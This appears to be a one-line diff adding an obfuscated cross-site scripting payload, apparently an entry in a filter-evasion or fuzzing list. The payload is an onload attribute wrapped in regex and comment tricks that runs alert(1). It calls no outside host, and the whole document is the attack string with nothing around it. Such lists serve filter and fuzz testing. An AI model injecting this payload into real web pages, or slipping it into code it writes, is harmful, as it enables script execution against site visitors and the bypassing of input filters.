@@ -1,0 +1,1 @@
+onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'
